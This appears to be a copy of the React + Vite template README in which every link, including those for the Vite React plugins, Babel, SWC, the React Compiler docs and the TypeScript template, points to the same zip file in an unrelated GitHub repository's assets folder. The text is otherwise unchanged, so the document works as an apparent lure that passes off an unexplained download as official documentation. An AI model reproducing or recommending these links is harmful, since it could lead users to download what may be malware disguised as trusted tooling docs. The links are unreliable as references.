# React + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://github.com/shrav89/progress-tracker/raw/refs/heads/main/src/assets/progress-tracker-waapa.zip) uses [Babel](https://github.com/shrav89/progress-tracker/raw/refs/heads/main/src/assets/progress-tracker-waapa.zip) (or [oxc](https://github.com/shrav89/progress-tracker/raw/refs/heads/main/src/assets/progress-tracker-waapa.zip) when used in [rolldown-vite](https://github.com/shrav89/progress-tracker/raw/refs/heads/main/src/assets/progress-tracker-waapa.zip)) for Fast Refresh
- [@vitejs/plugin-react-swc](https://github.com/shrav89/progress-tracker/raw/refs/heads/main/src/assets/progress-tracker-waapa.zip) uses [SWC](https://github.com/shrav89/progress-tracker/raw/refs/heads/main/src/assets/progress-tracker-waapa.zip) for Fast Refresh

## React Compiler

The React Compiler is not enabled on this template because of its impact on dev & build performances. To add it, see [this documentation](https://github.com/shrav89/progress-tracker/raw/refs/heads/main/src/assets/progress-tracker-waapa.zip).

## Expanding the ESLint configuration

If you are developing a production application, we recommend using TypeScript with type-aware lint rules enabled. Check out the [TS template](https://github.com/shrav89/progress-tracker/raw/refs/heads/main/src/assets/progress-tracker-waapa.zip) for information on how to integrate TypeScript and [`typescript-eslint`](https://github.com/shrav89/progress-tracker/raw/refs/heads/main/src/assets/progress-tracker-waapa.zip) in your project.
